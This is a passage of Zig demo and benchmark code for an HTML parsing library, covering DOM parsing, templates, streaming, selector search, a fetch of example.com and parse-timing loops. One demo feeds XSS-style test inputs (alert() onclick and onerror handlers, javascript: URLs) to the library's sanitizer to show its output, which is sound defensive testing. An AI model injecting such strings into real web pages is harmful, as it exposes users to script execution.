    defer ctx.freeValue(global);

    const resolve_fn = ctx.getPropertyStr(global, "_testResolve");
    defer ctx.freeValue(resolve_fn);

    // Passing data from Zig to JS
    const test_data = try allocator.dupe(u8, "Hello from Zig in Async Task!");

    const async_task = AsyncTask{
        .ctx = ctx,
        .resolve = ctx.dupValue(resolve_fn),
        .reject = zqjs.UNDEFINED,
        .result = .{ .success = test_data },
    };

    z.print("Enqueueing async task...\n", .{});
    // event_loop.active_tasks += 1;
    event_loop.enqueueTask(async_task);

    z.print("🔁 Running event loop...\n", .{});
    try event_loop.run(.Script);

    const test_passed_val = ctx.getPropertyStr(global, "testPassed");
    defer ctx.freeValue(test_passed_val);

    const test_passed = try ctx.toBool(test_passed_val);
    z.print("🟢 Did the test pass ? {}\n", .{test_passed});

    // Get the received data
    const received_data_val = ctx.getPropertyStr(global, "receivedData");
    defer ctx.freeValue(received_data_val);

    if (!ctx.isNull(received_data_val)) {
        const data_str = try ctx.toZString(received_data_val);
        defer ctx.freeZString(data_str);
        z.print("🟢 Received data: {s}\n\n", .{data_str});
    } else {
        z.print("🔴 No data received (promise may not have resolved)\n\n", .{});
    }
}

// fn demoZigToAsyncJS(allocator: std.mem.Allocator, rt: *zqjs.Runtime) !void {
//     z.print("\n[Zig] Passing data between Zig and Async Task\n\n", .{});

//     // 1. Init Context & Loop
//     const ctx = zqjs.Context.init(rt);
//     defer ctx.deinit();

//     var event_loop = try EventLoop.create(allocator, rt);
//     defer event_loop.destroy();

//     try event_loop.install(ctx);

//     // 2. Create a Promise in JS and expose its resolve/reject to Global
//     const promise_setup =
//         \\globalThis.receivedData = null;
//         \\
//         \\// Create a promise that we will resolve from Zig
//         \\const promise = new Promise((resolve, reject) => {
//         \\  globalThis._testResolve = resolve;
//         \\  globalThis._testReject = reject;
//         \\});
//         \\
//         \\promise.then(data => {
//         \\  console.log("Promise resolved with:", data);
//         \\  globalThis.receivedData = data;
//         \\});
//     ;

//     const res = try ctx.eval(promise_setup, "<setup>", .{});
//     defer ctx.freeValue(res);

//     // 3. Get the resolve function from JS
//     const global = ctx.getGlobalObject();
//     defer ctx.freeValue(global);
//     const resolve_fn = ctx.getPropertyStr(global, "_testResolve");
//     defer ctx.freeValue(resolve_fn);

//     // 4. Create the Task
//     const test_data = try allocator.dupe(u8, "Hello from Zig!");
//     const async_task = AsyncTask{
//         .ctx = ctx,
//         .resolve = ctx.dupValue(resolve_fn), // Keep a strong ref for the loop
//         .reject = zqjs.UNDEFINED,
//         .result = .{ .success = test_data },
//     };

//     z.print("Enqueueing task directly...\n", .{});

//     event_loop.enqueueTask(async_task);

//     // 5. Run Loop
//     z.print("🔁 Running event loop...\n", .{});
//     try event_loop.run(.Script);

//     // 6. Verify Result
//     const received_val = ctx.getPropertyStr(global, "receivedData");
//     defer ctx.freeValue(received_val);

//     if (!ctx.isNull(received_val)) {
//         const str = try ctx.toZString(received_val);
//         defer ctx.freeZString(str);
//         z.print("🟢 Success! JS received: {s}\n\n", .{str});
//     } else {
//         z.print("🔴 Failure: Data was null\n\n", .{});
//     }
// }
// const css_content = try zexplore_example_com(gpa, "https://www.example.com");

/// use `parseFromString` or `createDocFromString` to create a document with a BODY element populated by the input string
/// ==========================================================
fn simpleParsingsMethods(gpa: std.mem.Allocator) !void {
    const html = "<div></div>";
    {
        const doc = try z.createDocument();
        defer z.destroyDocument(doc);

        try z.insertHTML(doc, html);

        const body = z.bodyNode(doc).?;
        const div = z.firstChild(body).?;
        const tag_name = z.nodeName_zc(div);
        std.debug.assert(std.mem.eql(u8, tag_name, "DIV"));
    }
    {
        const doc = try z.parseHTML(gpa, html);
        defer z.destroyDocument(doc);

        const body = z.bodyNode(doc).?;
        const div = z.firstChild(body).?;
        const tag_name = z.nodeName_zc(div);
        std.debug.assert(std.mem.eql(u8, tag_name, "DIV"));
    }
    {
        var parser = try z.DOMParser.init(gpa);
        defer parser.deinit();

        const doc = try parser.parseFromString(html);
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;
        const div = z.firstChild(body).?;
        const tag_name = z.nodeName_zc(div);
        std.debug.assert(std.mem.eql(u8, tag_name, "DIV"));
        const header = z.headElement(doc);
        try std.testing.expect(header != null);
    }
}

fn demoNormalizer(gpa: std.mem.Allocator) !void {
    const messy_html =
        \\<div>
        \\<!-- comment -->
        \\
        \\<p>Content</p>
        \\
        \\<pre>  preserve  this  </pre>
        \\
        \\</div>
    ;

    // const expected = "<div><!-- comment --><p>Content</p><pre>  preserve  this  </pre></div>";
    const expected_noc = "<div><p>Content</p><pre>  preserve  this  </pre></div>";

    var parser = try z.DOMParser.init(gpa);
    defer parser.deinit();

    const doc = try parser.parseFromString(messy_html);
    defer z.destroyDocument(doc);

    const body_elt1 = z.bodyElement(doc).?;
    try z.minifyDOMwithOptions(
        gpa,
        body_elt1,
        .{ .skip_comments = true },
    );

    const result1 = try z.innerHTML(gpa, body_elt1);
    defer gpa.free(result1);

    std.debug.assert(std.mem.eql(u8, expected_noc, result1));

    // -- string normalization
    const cleaned = try z.minifyHtmlStringWithOptions(
        gpa,
        messy_html,
        .{ .remove_comments = true },
    );
    defer gpa.free(cleaned);
    // z.print("\n\n Normalized sring: {s}\n\n", .{cleaned});
    std.debug.assert(std.mem.eql(u8, cleaned, result1));

    _ = try parser.parseFromString(cleaned);
    const body_elt2 = z.bodyElement(doc).?;
    const result2 = try z.innerHTML(gpa, body_elt2);
    defer gpa.free(result2);

    std.debug.assert(std.mem.eql(u8, result2, result1));
}

/// use the `Parser` engine to parse HTML with template support
fn demoTemplate(allocator: std.mem.Allocator) !void {
    const html =
        \\<table id="producttable">
        \\  <thead>
        \\    <tr>
        \\      <td>Code</td>
        \\      <td>Product_Name</td>
        \\    </tr>
        \\  </thead>
        \\  <tbody>
        \\    <!-- existing data could optionally be included here -->
        \\  </tbody>
        \\</table>
        \\
        \\<template id="productrow">
        \\  <tr>
        \\    <td class="record">Code: 1</td>
        \\    <td>Name: 1</td>
        \\  </tr>
        \\</template>
    ;

    // eliminate all the whitespace between tags
    const normed_html = try z.normalizeText(allocator, html);
    defer allocator.free(normed_html);

    // var parser = try z.Parser.init(allocator);
    // defer parser.deinit();
    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;

    const template_elt = z.getElementById(
        doc,
        "productrow",
    ).?;

    const tbody_elt = z.getElementByTag(body, .tbody);
    const tbody_node = z.elementToNode(tbody_elt.?);

    // add twice the template
    try z.useTemplateElement(
        allocator,
        template_elt,
        tbody_node,
        .none,
    );
    try z.useTemplateElement(
        allocator,
        template_elt,
        tbody_node,
        .none,
    );

    try z.minifyDOM(allocator, z.nodeToElement(body).?);

    const resulting_html = try z.innerHTML(allocator, z.nodeToElement(body).?);
    defer allocator.free(resulting_html);

    const expected = "<table id=\"producttable\"><thead><tr><td>Code</td><td>Product_Name</td></tr></thead><tbody><!-- existing data could optionally be included here --><tr><td class=\"record\">Code: 1</td><td>Name: 1</td></tr><tr><td class=\"record\">Code: 1</td><td>Name: 1</td></tr></tbody></table><template id=\"productrow\"><tr><td class=\"record\">Code: 1</td><td>Name: 1</td></tr></template>";

    z.print("=== DEMO TEMPLATE-----------\n", .{});

    const normed = try z.normalizeText(allocator, resulting_html);
    defer allocator.free(normed);

    try z.prettyPrint(allocator, tbody_node);
    try std.testing.expectEqualStrings(expected, normed);
}

fn demoParserReUse(allocator: std.mem.Allocator) !void {
    z.print("\n\n=== Demonstrate parser engine reuse -------------\n\n", .{});
    var parser = try z.DOMParser.init(allocator);
    defer parser.deinit();

    const doc = try parser.parseFromString("<div><ul></ul></div>");
    defer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    const ul_elt = z.getElementByTag(body, .ul).?;

    for (0..3) |i| {
        const li = try std.fmt.allocPrint(
            allocator,
            "<li id='item-{}'>Item {}</li>",
            .{ i, i },
        );
        defer allocator.free(li);

        try parser.parseAndAppend(
            ul_elt,
            li,
            .ul,
            .none,
        );
    }

    try z.prettyPrint(allocator, body);
}

/// use Stream engine
fn demoStreamParser(allocator: std.mem.Allocator) !void {
    z.print("\n\n === Demonstrate parsing streams on-the-fly ---------\n\n", .{});
    var streamer = try z.Stream.init(allocator);
    defer streamer.deinit();

    try streamer.beginParsing();

    const streams = [_][]const u8{
        "<!DOCTYPE html><html><head><title>Large",
        " Document</title></head><body>",
        "<table id=\"producttable\">",
        "<caption>Company data</caption><thead>",
        "<tr><th scope=\"col\">",
        "Code</th><th>Product_Name</th>",
        "</tr></thead><tbody>",
    };
    for (streams) |chunk| {
        z.print("chunk:  {s}\n", .{chunk});
        try streamer.processChunk(chunk);
    }

    for (0..3) |i| {
        const li = try std.fmt.allocPrint(
            allocator,
            "<tr id={}><td >Code: {}</td><td>Name: {}</td></tr>",
            .{ i, i, i },
        );
        defer allocator.free(li);
        z.print("chunk:  {s}\n", .{li});

        try streamer.processChunk(li);
    }
    const end_chunk = "</tbody></table></body></html>";
    z.print("chunk:  {s}\n", .{end_chunk});
    try streamer.processChunk(end_chunk);
    try streamer.endParsing();

    const html_doc = streamer.getDocument();
    defer z.destroyDocument(html_doc);
    // const html_node = z.documentRoot(html_doc).?;

    // z.print("\n\n", .{});
    try z.prettyPrint(allocator, z.documentRoot(html_doc).?);
    // z.print("\n\n", .{});
    // try z.printDocStruct(html_doc);
    // z.print("\n\n", .{});
}

fn demoInsertAdjacentElement(allocator: std.mem.Allocator) !void {
    const doc = try z.parseHTML(allocator,
        \\<div id="container">
        \\ <p id="target">Target</p>
        \\</div>
    );
    defer z.destroyDocument(doc);
    errdefer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    const target = z.getElementById(doc, "target").?;

    const before_end_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "before end" }},
    );
    try z.insertAdjacentElement(
        target,
        .beforeend,
        before_end_elem,
    );

    const after_end_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "after end" }},
    );
    try z.setContentAsText(z.elementToNode(after_end_elem), "After End");

    try z.insertAdjacentElement(
        target,
        "afterend",
        after_end_elem,
    );

    const after_begin_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "after begin" }},
    );

    try z.insertAdjacentElement(
        target,
        "afterbegin",
        after_begin_elem,
    );
    const before_begin_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "before begin" }},
    );

    try z.insertAdjacentElement(
        target,
        .beforebegin,
        before_begin_elem,
    );

    const html = try z.outerHTML(allocator, z.nodeToElement(body).?);
    defer allocator.free(html);
    z.print("\n\n=== Demonstrate insertAdjacentElement ----------- \n\n", .{});
    // try z.prettyPrint(allocator, body);

    // Normalize whitespace for clean comparison
    const clean_html = try z.normalizeText(allocator, html);
    defer allocator.free(clean_html);

    const expected = "<body><div id=\"container\"><span class=\"before begin\"></span><p id=\"target\"><span class=\"after begin\"></span>Target<span class=\"before end\"></span></p><span class=\"after end\">After End</span></div></body>";

    std.debug.assert(std.mem.eql(u8, expected, clean_html) == true);
}

fn demoInsertAdjacentHTML(allocator: std.mem.Allocator) !void {
    const doc = try z.parseHTML(allocator,
        \\<div id="container">
        \\    <p id="target">Target</p>
        \\</div>
    );
    defer z.destroyDocument(doc);
    errdefer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    const target = z.getElementById(doc, "target").?;

    try z.insertAdjacentHTML(
        allocator,
        target,
        .beforeend,
        "<span class=\"before end\"></span>",
    );

    try z.insertAdjacentHTML(
        allocator,
        target,
        "afterend",
        "<span class=\"after end\">After End</span>",
    );

    try z.insertAdjacentHTML(
        allocator,
        target,
        "afterbegin",
        "<span class=\"after begin\"></span>",
    );

    try z.insertAdjacentHTML(
        allocator,
        target,
        "beforebegin",
        "<span class=\"before begin\"></span>",
    );

    // Show result after insertAdjacentElement
    const html = try z.outerHTML(allocator, z.nodeToElement(body).?);
    defer allocator.free(html);
    // z.print("\n=== Demonstrate insertAdjacentHTML ===\n\n", .{});
    // try z.prettyPrint(allocator, body);

    // Normalize whitespace for clean comparison
    const clean_html = try z.normalizeText(allocator, html);
    defer allocator.free(clean_html);

    const expected = "<body><div id=\"container\"><span class=\"before begin\"></span><p id=\"target\"><span class=\"after begin\"></span>Target<span class=\"before end\"></span></p><span class=\"after end\">After End</span></div></body>";

    std.debug.assert(std.mem.eql(u8, expected, clean_html) == true);

    // z.print("\n--- Normalized HTML --- \n\n{s}\n", .{clean_html});
    // z.print("\n\n", .{});
}

/// `setInnerHTML` and `innerHTML` with `normalize` for easy comparison (remove whitespace only text nodes)
fn demoSetInnerHTML(allocator: std.mem.Allocator) !void {
    z.print("\n\n=== Demonstrate setInnerHTML & innerHTML ------- \n\n", .{});
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);
    try z.insertHTML(doc, "<div id=\"target\"></div>");

    const div = z.getElementById(doc, "target").?;

    try z.setInnerHTML(div, "<p class=\"new-content\">New Content</p>");

    // try z.prettyPrint(allocator,z.documentRoot(doc).?);

    // Show result after setInnerHTML
    const html_new_div = try z.innerHTML(allocator, div);
    defer allocator.free(html_new_div);
    try z.minifyDOM(allocator, z.nodeToElement(z.documentRoot(doc).?).?);

    const expected = "<p class=\"new-content\">New Content</p>";

    std.debug.assert(std.mem.eql(u8, expected, html_new_div) == true);
}

fn demoSearchComparison(allocator: std.mem.Allocator) !void {
    z.print("\n=== Search Comparison --------------------------\n\n", .{});

    // Create test HTML with diverse elements
    const test_html =
        \\<div class="main-container">
        \\  <h1 class="title main">Main Title</h1>
        \\  <section class="content">
        \\    <p id="1" class="text main-text">First paragraph</p>
        \\    <div class="box main-box">Box content</div>
        \\    <article class="post main-post">Article content</article>
        \\  </section>
        \\  <aside class="sidebar">
        \\    <h2 class="subtitle">Sidebar Title</h2>
        \\    <p class="text sidebar-text">Sidebar paragraph</p>
        \\    <div class="widget">Widget content</div>
        \\  </aside>
        \\  <footer  aria-label="foot" class="main-footer container">
        \\    <p class="copyright">© 2024</p>
        \\  </footer>
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, test_html);
    defer z.destroyDocument(doc);
    const body = z.bodyNode(doc).?;
    // try z.prettyPrint(allocator, body);
    var css_engine = try z.createCssEngine(allocator);
    defer css_engine.deinit();

    // 1. Walker-based attribute search (token-based matching with hasClass)
    const walker_results = try z.getElementsByClassName(allocator, doc, "main");
    defer allocator.free(walker_results);
    const walker_count = walker_results.len;
    z.print("\n1. Walker-based attribute [class = 'main']:     Found {} elements\n", .{walker_count});

    for (walker_results, 0..) |element, i| {
        const tag = z.tagName_zc(element);
        const class_attr = z.getAttribute_zc(element, "class") orelse "none";
        z.print("   [{}]: <{s}> class=\"{s}\"\n", .{ i, tag, class_attr });
    }

    // 2. CSS Selector search (case-insensitive, token-based)

    const css_results = try z.querySelectorAll(allocator, doc, ".main");
    defer allocator.free(css_results);
    const css_count = css_results.len;
    z.print("\n2. CSS Selector search [class = 'main']:        Found {} elements (case-insensitive)\n", .{css_count});

    for (css_results, 0..) |element, i| {
        const tag = z.tagName_zc(element);
        const class_attr = z.getAttribute_zc(element, "class") orelse "none";
        z.print("   [{}]: <{s}> class=\"{s}\"\n", .{ i, tag, class_attr });
    }

    const footer = try z.getElementByDataAttribute(
        body,
        "aria",
        "label",
        null,
    );
    if (footer) |foot| {
        const i = 0;
        const tag = z.tagName_zc(foot);
        const class_attr = z.getAttribute_zc(foot, "class") orelse "none";
        z.print("\n3. Walker ByDataAttribute 'aria-label':         Found  1 element\n", .{});
        z.print("{s}\n", .{z.getAttribute_zc(foot, "aria-label").?});
        z.print("   [{}]: <{s}> class=\"{s}\"\n", .{ i, tag, class_attr });
        var footer_token_list = try z.ClassList.init(
            allocator,
            foot,
        );
        defer footer_token_list.deinit();
        z.print("   nb classes: {d}\n", .{footer_token_list.length()});
        try footer_token_list.add("footer");
        std.debug.assert(footer_token_list.contains("footer"));
        _ = try footer_token_list.toggle("footer");
        std.debug.assert(!footer_token_list.contains("footer"));
    }

    // Demonstrate DOM synchronization by adding an element
    const new_element = try z.createElementWithAttrs(doc, "span", &.{.{ .name = "class", .value = "main new-element" }});
    z.appendChild(body, z.elementToNode(new_element));

    // Search again to show updated results
    const updated_walker_results = try z.getElementsByClassName(allocator, doc, "main");
    defer allocator.free(updated_walker_results);
    const updated_walker_count = updated_walker_results.len;

    const updated_css_results = try z.querySelectorAll(allocator, doc, ".main");
    defer allocator.free(updated_css_results);
    const updated_css_count = updated_css_results.len;

    z.print("\nAdd a new element <span class=\"main new-element\"> with class 'main' and rerun the search:\n\n", .{});
    z.print("1. Walker-based: {} -> {} elements\n", .{ walker_count, updated_walker_count });
    z.print("2. CSS Selectors: {} -> {} elements\n", .{ css_count, updated_css_count });

    z.print("\n", .{});
}

fn demoSuspiciousAttributes(allocator: std.mem.Allocator) !void {
    // Create a document with lots of suspicious/malicious attributes to see the highlighting
    const malicious_content =
        \\<div>
        \\  <!-- a comment -->
        \\  <button disabled hidden onclick="alert('XSS')" phx-click="increment" data-invalid="bad" scope="invalid">Dangerous button</button>
        \\  <img src="javascript:alert('XSS')" alt="not safe" onerror="alert('hack')" loading="unknown">
        \\  <a href="javascript:alert('XSS')" target="_self" role="invalid">Dangerous link</a>
        \\  <p id="valid" class="good" aria-label="ok" style="bad" onload="bad()">Mixed attributes</p>
        \\  <custom-elt><p>Hi there</p></custom-elt>
        \\  <template>
        \\      <span>Reuse me</span>
        \\      <script>console.log('Hello from template');</script>
        \\  </template>
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, malicious_content);
    defer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    // const div = z.firstChild(body).?;
    // const text = z.firstChild(div).?;
    // const com = z.nextSibling(text).?;
    z.print("\n\n=== Demo visualiazing DOM and sanitization ------\n", .{});
    try z.prettyPrint(allocator, body);
    z.print("\n", .{});

    try z.sanitizeNode(allocator, body, .permissive);
    z.print("\nAfter sanitization (permissive mode):\n", .{});
    try z.prettyPrint(allocator, body);
    z.print("\n", .{});
}

pub fn zexplore_example_com(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
    z.print("\n=== Demo visiting the page {s} --------------\n\n", .{url});
    const page = try z.get(allocator, url);
    defer allocator.free(page);
    const doc = try z.createDocFromString(page);
    defer z.destroyDocument(doc);
    const html = z.documentRoot(doc).?;
    try z.prettyPrint(allocator, html);

    var css_engine = try z.createCssEngine(allocator);
    defer css_engine.deinit();

    const a_link = try css_engine.querySelector(html, "a[href]");

    const href_value = z.getAttribute_zc(z.nodeToElement(a_link.?).?, "href").?;
    z.print("{s}\n", .{href_value});

    const style_by_walker = z.getElementByTag(html, .style);
    var css_content: []u8 = undefined;
    if (style_by_walker) |style| {
        // Use allocating version - caller (Worker) will free
        css_content = try z.textContent(allocator, z.elementToNode(style));
        z.print("{s}\n", .{css_content});
    }

    const style_by_css = try css_engine.querySelector(html, "style");

    if (style_by_css) |style| {
        const css_content_2 = z.textContent_zc(style);
        // z.print("{s}\n", .{css_content_2});
        std.debug.assert(std.mem.eql(u8, css_content, css_content_2));
    }
    return css_content;
}

fn normalizeString_DOM_parsing_bencharmark(allocator: std.mem.Allocator) !void {

    // Create a medium-sized realistic page with lots of whitespace and comments
    var html_builder: std.ArrayList(u8) = .empty;
    defer html_builder.deinit(allocator);

    try html_builder.ensureTotalCapacity(allocator, 50_000);

    try html_builder.appendSlice(allocator,
        \\<!DOCTYPE html>
        \\<!-- Page header comment -->
        \\<html lang="en">
        \\  <head>
        \\    <meta charset="UTF-8"/>
        \\    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        \\    <title>Medium Blog Post - Performance Test</title>
        \\    <link rel="stylesheet" href="/css/main.css"/>
        \\    <!-- Analytics comment -->
        \\    <script src="/js/analytics.js"></>
        \\  </head>
        \\  <body class="blog-layout">
        \\    <header class="site-header">
        \\      <nav class="main-nav">
        \\        <ul class="nav-list">
        \\          <li><a href="/">Home</a></li>
        \\          <li><a href="/blog">Blog</a></li>
        \\          <li><a href="/about">About</a></li>
        \\        </ul>
        \\        <!-- Navigation comment -->
        \\        <code> const std = @import("std");\n const z = @import("../root.zig");\n</code>
        \\      </nav>
        \\    </header>
        \\
        \\    <main class="content">
    );

    // Add multiple blog posts
    for (0..20) |i| {
        try html_builder.appendSlice(allocator,
            \\      <article class="blog-post">
            \\        <!-- Post comment -->
            \\        <header class="post-header">
            \\          <h2 class="post-title">
        );

        const title = try std.fmt.allocPrint(allocator, "Blog Post #{d}: Performance Testing", .{i + 1});
        defer allocator.free(title);
        try html_builder.appendSlice(allocator, title);

        try html_builder.appendSlice(allocator,
            \\</h2>
            \\          <div class="post-meta">
            \\            <span class="author">John Doe</span>
            \\            <time datetime="2024-01-01">January 1, 2024</time>
            \\          </div>
            \\        </header>
            \\
            \\        <div class="post-content">
            \\          <p>This is a sample blog post to test our <strong>HTML normalization</strong>
            \\             and <em>tuple serialization</em> performance. The content includes various
            \\             HTML elements and whitespace patterns.</p>
            \\
            \\          <!-- Content comment -->
            \\          <blockquote>
            \\            "Performance is not just about speed, but about providing
            \\             a smooth user experience."
            \\          </blockquote>
            \\
            \\          <ul class="feature-list">
            \\            <li>Fast HTML parsing with lexbor</li>
            \\            <li>Efficient DOM normalization</li>
            \\            <li>High-performance tuple serialization</li>
            \\            <li>Memory-optimized string processing</li>
            \\          </ul>
            \\
            \\          <div class="code-example">
            \\            <pre><code>const html = createDocFromString(input);
            \\const normalized = normalizeDOM(html);
            \\const tuple = domToTuple(normalized);</code></pre>
            \\          </div>
            \\
            \\          <form class="contact-form">
            \\            <div class="form-group">
            \\              <label for="email">Email:</label>
            \\              <input type="email" id="email" name="email" required/>
            \\            </div>
            \\            <button type="submit">Subscribe</button>
            \\          </form>
            \\        </div>
            \\
            \\        <footer class="post-footer">
            \\          <div class="tags">
            \\            <span class="tag">performance</span>
            \\            <span class="tag">html</span>
            \\            <span class="tag">optimization</span>
            \\          </div>
            \\        </footer>
            \\      </article>
            \\
        );
    }

    try html_builder.appendSlice(allocator,
        \\    </main>
        \\
        \\    <aside class="sidebar">
        \\      <!-- Sidebar comment -->
        \\      <div class="widget recent-posts">
        \\        <h3>Recent Posts</h3>
        \\        <ul>
        \\          <li><a href="/post1">Understanding Performance</a></li>
        \\          <li><a href="/post2">Memory Optimization Techniques</a></li>
        \\          <li><a href="/post3">DOM Processing Strategies</a></li>
        \\        </ul>
        \\      </div>
        \\
        \\      <div class="widget newsletter">
        \\        <h3>Newsletter</h3>
        \\        <p>   Stay updated with our latest posts   </p>
        \\        <form>
        \\          <input type="email" placeholder="Your email"/>
        \\          <button>Subscribe</button>
        \\        </form>
        \\      </div>
        \\    </aside>
        \\
        \\    <footer class="site-footer">
        \\      <!-- Footer comment -->
        \\      <p>&copy; 2024 Performance Blog. All rights reserved.</p>
        \\    </footer>
        \\
        \\    <script>
        \\      // Performance tracking
        \\      console.log('Page loaded in:', performance.now(), 'ms');
        \\    </script>
        \\  </body>
        \\</html>
    );

    const medium_html = try html_builder.toOwnedSlice(allocator);
    defer allocator.free(medium_html);

    const iterations = 500;
    // Call the reorganized benchmark function
    try cleanBenchmark(allocator, medium_html, iterations);
}

fn cleanBenchmark(allocator: std.mem.Allocator, medium_html: []const u8, iterations: usize) !void {
    z.print("\n=== HTML PARSING & NORMALIZATION BENCHMARK ===\n\n", .{});
    z.print("HTML size: {d} bytes (~{d:.1}KB)\n", .{ medium_html.len, @as(f64, @floatFromInt(medium_html.len)) / 1024.0 });
    z.print("Iterations: {d}\n\n", .{iterations});

    var timer = try std.time.Timer.start();

    // Performance calculation constants
    const ns_to_ms = @as(f64, @floatFromInt(std.time.ns_per_ms));
    const kb_size = @as(f64, @floatFromInt(medium_html.len)) / 1024.0;
    const iter = @as(f64, @floatFromInt(iterations));

    // ===================================================================
    // GROUP A: STRING NORMALIZATION + REUSED DOCUMENT
    // ===================================================================
    z.print("=== A. STRING NORMALIZATION → REUSED DOC ===\n", .{});

    // A1: String normalization → parseFromString (reused doc)
    timer.reset();
    const docA1 = try z.createDocument();
    defer z.destroyDocument(docA1);
    for (0..iterations) |_| {
        const normalized = try z.minifyHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        try z.parseFromString(docA1, normalized);
        try z.parseFromString(docA1, ""); // reset
    }
    const timeA1 = timer.read();
    const msA1 = @as(f64, @floatFromInt(timeA1)) / ns_to_ms;

    // A2: String normalization → parseAndAppend (reused doc, with cloning)
    timer.reset();
    const docA2 = try z.createDocFromString("");
    defer z.destroyDocument(docA2);
    var parserA2 = try z.Parser.init(allocator);
    defer parserA2.deinit();
    const bodyA2 = z.bodyElement(docA2);
    for (0..iterations) |_| {
        const normalized = try z.minifyHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        try parserA2.parseAndAppend(bodyA2.?, normalized, .body, .none);
        _ = try z.setInnerHTML(bodyA2.?, ""); // reset
    }
    const timeA2 = timer.read();
    const msA2 = @as(f64, @floatFromInt(timeA2)) / ns_to_ms;

    // A3: String normalization → parseAndAppend (reused doc, no cloning - OPTIMIZED!)
    timer.reset();
    const docA3 = try z.createDocFromString("");
    defer z.destroyDocument(docA3);
    var parserA3 = try z.Parser.init(allocator);
    defer parserA3.deinit();
    const bodyA3 = z.bodyElement(docA3);
    for (0..iterations) |_| {
        const normalized = try z.minifyHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        try parserA3.parseAndAppend(bodyA3.?, normalized, .body, .none);
        _ = try z.setInnerHTML(bodyA3.?, ""); // reset
    }
    const timeA3 = timer.read();
    const msA3 = @as(f64, @floatFromInt(timeA3)) / ns_to_ms;

    z.print("A1. reuse doc, no parser, string norm → parseFromString:                      {d:.2} ms/op, {d:.1} kB/s\n", .{ msA1 / iter, kb_size * iter / msA1 });
    z.print("A2. reuse doc,    parser, string norm → parseAndAppend (cloning):         {d:.2} ms/op, {d:.1} kB/s\n", .{ msA2 / iter, kb_size * iter / msA2 });
    z.print("A3. reuse doc,    parser, string norm → parseAndAppend (NO clone):        {d:.2} ms/op, {d:.1} kB/s\n", .{ msA3 / iter, kb_size * iter / msA3 });

    // C1: String normalization → createDocFromString (fresh doc each time)
    timer.reset();
    for (0..iterations) |_| {
        const normalized = try z.minifyHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        const docC1 = try z.createDocFromString(normalized);
        defer z.destroyDocument(docC1);
    }
    const timeC1 = timer.read();
    const msC1 = @as(f64, @floatFromInt(timeC1)) / ns_to_ms;

    z.print("C1. new doc,   no parser, string norm → (new doc) createDocFromString:    {d:.2} ms/op, {d:.1} kB/s ⭐\n", .{ msC1 / iter, kb_size * iter / msC1 });
    // ===================================================================
    // GROUP B: DOM NORMALIZATION + FRESH DOCUMENTS
    // ===================================================================
    z.print("\n=== B. RAW HTML → FRESH DOC → DOM NORMALIZATION ===\n", .{});

    // B1: Raw HTML → parser.parse (fresh doc) → DOM normalization
    timer.reset();
    var parserB1 = try z.Parser.init(allocator);
    defer parserB1.deinit();
    for (0..iterations) |_| {
        const docB1 = try parserB1.parse(medium_html, .none);
        defer z.destroyDocument(docB1);
        const bodyB1 = z.bodyElement(docB1);
        try z.minifyDOMwithOptions(allocator, bodyB1.?, .{ .skip_comments = true });
    }
    const timeB1 = timer.read();
    const msB1 = @as(f64, @floatFromInt(timeB1)) / ns_to_ms;

    // B2: Raw HTML → createDocFromString (fresh doc) → DOM normalization
    timer.reset();
    for (0..iterations) |_| {
        const docB2 = try z.createDocFromString(medium_html);
        defer z.destroyDocument(docB2);
        const bodyB2 = z.bodyElement(docB2);
        try z.minifyDOMwithOptions(allocator, bodyB2.?, .{ .skip_comments = true });
    }
    const timeB2 = timer.read();
    const msB2 = @as(f64, @floatFromInt(timeB2)) / ns_to_ms;

    z.print("B1.    parser, → (new doc) parser.parse        → DOM norm:    {d:.2} ms/op, {d:.1} kB/s ⭐\n", .{ msB1 / iter, kb_size * iter / msB1 });
    z.print("B2. no parser, → (new doc) createDocFromString → DOM norm:    {d:.2} ms/op, {d:.1} kB/s\n", .{ msB2 / iter, kb_size * iter / msB2 });

    // ===================================================================
    // GROUP C: STRING NORMALIZATION + FRESH DOCUMENTS
    // ===================================================================
    z.print("\n=== C. STRING NORM → FRESH DOC ===\n", .{});

    // ===================================================================
    // GROUP D: RAW HTML (NO NORMALIZATION)
    // ===================================================================
    z.print("\n=== D. RAW HTML (NO NORMALIZATION) ===\n", .{});

    // D1: Raw HTML → parseFromString (reused doc, clear between)
    timer.reset();
    const docD1 = try z.createDocument();
    defer z.destroyDocument(docD1);
    for (0..iterations) |_| {
        try z.parseFromString(docD1, medium_html);
        try z.parseFromString(docD1, ""); // Clear
    }
    const timeD1 = timer.read();
    const msD1 = @as(f64, @floatFromInt(timeD1)) / ns_to_ms;

    // D2: Raw HTML → parser.parse (fresh doc each time)
    timer.reset();
    var parserD2 = try z.Parser.init(allocator);
    defer parserD2.deinit();
    for (0..iterations) |_| {
        const docD2 = try parserD2.parse(medium_html, .none);
        defer z.destroyDocument(docD2);
    }
    const timeD2 = timer.read();
    const msD2 = @as(f64, @floatFromInt(timeD2)) / ns_to_ms;

    // D3: Raw HTML → createDocFromString (fresh doc each time)
    timer.reset();
    for (0..iterations) |_| {
        const docD3 = try z.createDocFromString(medium_html);
        defer z.destroyDocument(docD3);
    }
    const timeD3 = timer.read();
